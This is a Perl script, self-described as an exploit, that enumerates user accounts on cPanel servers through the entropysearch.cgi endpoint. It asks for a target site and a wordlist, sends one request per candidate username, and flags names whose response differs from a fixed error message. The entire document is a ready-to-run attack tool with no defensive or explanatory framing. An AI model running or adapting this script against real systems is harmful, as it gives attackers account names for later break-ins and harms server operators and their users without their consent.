#!/usr/bin/perl -w
##
## EntropySearch.cgi User Enumeration Exploit
## ******************************************
## Exploit
## CPanel's entropysearch.cgi allows enumeration 
## of users
## ******************************************
## Author - Isonyx

use warnings;
use strict;
use LWP::Simple;

my @segments = ();
my $dictionary;

sub input();
sub request;

print "\n-------------------------------------------------------";
print "\n  CPanel EntropySearch.cgi User Enumeration Exploit";
print "\n  Configured to use default cgi-sys directory";
print "\n-------------------------------------------------------\n\n";

input();
request(@segments);

sub input() {
	print "[?] What site would you like to enumerate the users for? (required): ";
	$segments[0] = <>;
	chomp($segments[0]);
	
	print "[?] Enter a specific query to use (otherwise leave blank): ";
	$segments[1] = <>;
	chomp($segments[1]);
	
	print "[?] Enter a specific baseref to use (otherwise leave blank): ";
	$segments[2]= <>;
	chomp($segments[2]);
	
	print "[?] Enter the location of a dictionary file to use (required): ";
	$segments[3] = <>;
	chomp($segments[3]);
}

sub request {
	my $found;
	
	print "\n[+] Checking the validity of the site.";
	
	if (!get("http://$_[0]/cgi-sys/entropysearch.cgi?query=$_[1]&user=&baseref=$_[2]")) {
		print "\n[-] Invalid site specified. Terminating script.\n";
		exit;
	}
	
	print "\n[+] Opening the file $_[3] for reading.\n";
	open my $lines, $_[3] or die "Could not open dictionary for reading: $!";
	
	print "[+] Enumerating users according to dictionary. Please wait...\n";
	while (my $line = <$lines>) {
		chomp($line);
		my $request = get("http://$_[0]/cgi-sys/entropysearch.cgi?query=$_[1]&user=$line&baseref=$_[2]");
		if ($request ne "Could not chdir into /.htmltemplates: No such file or directory") {
			print "\n[!] Found the user $line.";
			$found = 1;
		}	
	}
	print "\n\n[+] User enumeration has been completed.\n";
	
	if (!$found) { print "[-] No users were able to be enumerated.\n"; }	
}